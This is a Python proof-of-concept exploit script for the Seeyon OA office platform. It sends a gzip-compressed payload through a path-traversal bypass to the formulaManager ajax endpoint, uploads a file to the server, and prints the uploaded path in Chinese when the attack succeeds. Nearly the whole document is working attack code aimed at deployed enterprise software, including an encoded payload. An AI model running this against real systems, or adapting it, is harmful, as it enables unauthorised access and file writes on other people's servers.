#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib
import urllib3

urllib3.disable_warnings()

def verify(site):
    test_url2 = target + "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data="managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%13u%C2%91MO%C3%830%0C%C2%86%C3%8F%C3%B0%2B%C2%A2%5E%C3%92%C2%8A%C2%91%C2%AAcB%C2%88i%07%26%C2%B6%23%02%C3%B6%C3%81%01q%C3%88Z%C2%97%05%C2%A5I%C3%94%C2%A4%C2%ACS%C2%B5%C3%BFN%C2%B2t%C2%B4%12%23%17%7F%C3%84%7E%C3%BD%C3%88%7Eop.%C3%8B%C2%A2%C3%A2t%C2%B9W%C2%80%C3%AFQ2%40%C2%A7%C3%8C%13-%5C%06%1B%C3%90%06w%C3%A9Y%C2%ADJ%C3%90%C2%9AI%C3%A1%3E%17%C2%A6d%C3%A2%13%29j%C2%B6h%C2%82%02B%C3%A2%1Dl%C2%A8R%3A%C3%96%00%7B%29%C3%A2%60%7C%C2%89%C3%BC%C2%BB%C3%B8%C2%A2%C3%9F%C2%940I%C2%9Em%C2%8By%2B%C2%99%C2%81%12%C2%A9%C3%8E%1FZ%01%01%3Bt%C2%A6%2Ct%C3%BAW%C2%81%23I%C2%867%23bj%13D%C2%BF%C3%82%C2%A8%C2%85%C3%90%5B%C3%A0%C3%9CQ%C2%AC%C3%85Zo%C3%B8%C3%AB%7C%C2%95%C2%BCL%C2%BA%C3%B9HW%C2%82%14L%C2%A7d%C3%BA%C2%B0%C2%98%C3%9D%C2%8E%1E%21%C2%95%C2%99E%C3%88Z%C3%AB%C2%A7%C2%9F%2F%0A%C3%BFN%C3%B3mm%C3%A0%7B%7D%10%C2%B6%C2%82%C3%84%C3%9Bi%C2%95%C3%A7V%C3%A0%08%17%0D%C2%82%C3%95r%7E%7D%C3%97%C2%87%C3%AFo%C2%80%1C%03.%C3%82%C2%BE%C3%B8%7F%C2%B5%29%C2%97%1A%2C%C3%98a%C3%AC%C3%B6b%C2%9D%0Cr%C2%A4%0D5%2CEu%5D%C2%87Q%C2%83%0F%C3%B6l%C3%B6t%C2%8D%C2%B3%C2%A6%C2%AC%00%7F%C3%BC%00%C2%92%7EpU%C3%B1%01%00%00"
    r = requests.post(url=test_url2,headers=headers,data=data,verify=False,timeout=5)
    if r.status_code==500 and '"message":null' in r.text:
        return target+'/seeyon/test1234.txt'
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    data = verify(target)
    if data:
        print("[+]漏洞存在，上传后的图片路径为：", data)
    else:
        print("[-]漏洞不存在")
